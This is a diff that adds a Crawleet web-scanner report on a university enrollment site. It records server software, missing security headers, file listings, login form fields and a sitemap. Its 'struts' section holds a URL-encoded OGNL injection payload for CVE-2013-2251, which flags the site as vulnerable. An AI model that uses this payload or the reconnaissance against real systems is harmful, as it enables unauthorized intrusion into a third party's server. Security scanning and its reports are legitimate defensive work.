@@ -1,0 +1,147 @@
+
+
+############################################################
+execution
+############################################################
+Crawleet by truerandom
+Scan date: 2018-09-27
+Startpage: http://www.escolares.dgenp.unam.mx/
+Depth: 4
+Delay: 0.2
+MaxFiles: 20
+Run External Tools: False
+Excluded dirs: 
+Bruteforce: False
+Wordlist: /root/crawleet/data/wordlist.txt
+Bruteforce extensions: 
+Config file: /root/crawleet/data/scanningtools.xml
+Allow Redirects: False
+Verify Certs: True
+Cookies: &lt;RequestsCookieJar[]&gt;
+Useragent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko
+Tor: False
+Proxies:{}
+Timeout: 3.0
+IP used: 132.248.124.170
+
+############################################################
+headers
+############################################################
+************ Info Headers **************
+Server: GlassFish Server Open Source Edition  4.1.1
+X-Powered-By: JSP/2.3
+*********Missing Secure Headers*********
+X-Content-Type-Options not found
+X-Frame-Options not found
+Strict-Transport-Security not found
+X-XSS-Protection not found
+Content-Security-Policy not found
+Public-Key-Pins not found
+
+############################################################
+http methods
+############################################################
+POST
+OPTIONS
+GET
+
+############################################################
+statistics
+############################################################
+Puntuation: 47
+Priority: 
+2
+Resources: 3
+Broken Links: 0
+Files found: 17
+External links: 0
+Directory listing: 0
+content: 1
+
+############################################################
+files
+############################################################
+http://escolares.dgenp.unam.mx/css/iae.css
+http://escolares.dgenp.unam.mx/js/jquery-1.8.0.min.js
+http://escolares.dgenp.unam.mx/js/roll_over_head.js
+http://www.escolares.dgenp.unam.mx/css/iae.css
+http://www.escolares.dgenp.unam.mx/images/ayuda.png
+http://www.escolares.dgenp.unam.mx/images/globoid.png
+http://www.escolares.dgenp.unam.mx/images/globopass.png
+http://www.escolares.dgenp.unam.mx/images/iae.jpg
+http://www.escolares.dgenp.unam.mx/images/iae_logo.jpg
+http://www.escolares.dgenp.unam.mx/images/reload.png
+http://www.escolares.dgenp.unam.mx/images/transparencia.png
+http://www.escolares.dgenp.unam.mx/js/general.js
+http://www.escolares.dgenp.unam.mx/js/head.js
+http://www.escolares.dgenp.unam.mx/js/jquery-1.8.0.min.js
+http://www.escolares.dgenp.unam.mx/js/pie.js
+http://www.escolares.dgenp.unam.mx/js/roll_over_head.js
+http://www.escolares.dgenp.unam.mx/simpleImg.png
+
+############################################################
+content
+############################################################
+http://www.escolares.dgenp.unam.mx/inLog -> [(u'USUARIO NO ENCONTRADO', u'USUARIO')]
+
+############################################################
+Resources
+############################################################
+
+http://www.escolares.dgenp.unam.mx/
+Form: inLog
+
+http://escolares.dgenp.unam.mx/.
+Form: inLog
+
+http://www.escolares.dgenp.unam.mx/inLog
+Form: /inLog
+
+############################################################
+Forms
+############################################################
+
+http://www.escolares.dgenp.unam.mx/inLog
+	POST
+	&lt;InputElement 7faf441fd1b0 name='answer' type='text'&gt;
+	&lt;InputElement 7faf441fd0a8 name='clave' type='text'&gt;
+	&lt;InputElement 7faf441fd100 name='pass' type='password'&gt;
+
+http://escolares.dgenp.unam.mx/inLog
+	POST
+	&lt;InputElement 7faf441fdba8 name='answer' type='text'&gt;
+	&lt;InputElement 7faf441fd730 name='clave' type='text'&gt;
+	&lt;InputElement 7faf441fdaf8 name='pass' type='password'&gt;
+
+############################################################
+struts
+############################################################
+[ http://www.escolares.dgenp.unam.mx/inLog?%72%65%64%69%72%65%63%74%3a%24%7b%23%72%65%71%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%71%75%65%73%74%27%29%2c%23%61%3d%23%72%65%71%2e%67%65%74%53%65%73%73%69%6f%6e%28%29%2c%23%62%3d%23%61%2e%67%65%74%53%65%72%76%6c%65%74%43%6f%6e%74%65%78%74%28%29%2c%23%63%3d%23%62%2e%67%65%74%52%65%61%6c%50%61%74%68%28%22%2f%22%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%22%74%72%75%65%72%61%6e%64%6f%6d%22%2e%74%6f%55%70%70%65%72%43%61%73%65%28%29%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d ] ====== VULNERABLE TO: cve-2013-2251 =====
+
+############################################################
+sitemap
+############################################################
+http://www.escolares.dgenp.unam.mx/
+├── inLog
+├── css
+│   └── iae.css
+├── js
+│   ├── roll_over_head.js
+│   ├── jquery-1.8.0.min.js
+│   ├── general.js
+│   ├── head.js
+│   └── pie.js
+├── images
+│   ├── iae.jpg
+│   ├── ayuda.png
+│   ├── transparencia.png
+│   ├── globoid.png
+│   ├── globopass.png
+│   ├── reload.png
+│   └── iae_logo.jpg
+└── simpleImg.png
+
+############################################################
+dns subdomains
+############################################################
+escolares.dgenp.unam.mx
